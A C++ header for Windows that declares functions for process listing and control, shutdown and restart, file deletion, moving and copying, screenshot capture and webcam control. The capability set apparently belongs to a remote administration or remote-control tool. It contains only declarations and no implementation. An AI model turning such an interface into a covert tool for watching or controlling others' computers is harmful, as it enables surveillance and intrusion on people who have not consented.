#pragma once

#include <atomic>
#include <fstream>
#include <iostream>
#include <string>
#include <thread>
#include <windows.h>

#include "const.h"

bool listProcess(std::string& result);
bool startProcess(std::string& processName, std::string& result);
bool stopProcess(std::string& processName, std::string& result);
bool shutdown(std::string& result);
bool restart(std::string& result);
bool deleteFile(std::string& fileName, std::string& result);
bool moveFile(std::string& filenames, std::string& result);
bool copyFile(std::string& filenames, std::string& result);
bool captureScreenshot(std::string& filePath, std::string& result, std::ifstream& in);
bool startWebcam(std::string& result);
bool stopWebcam(std::string& result);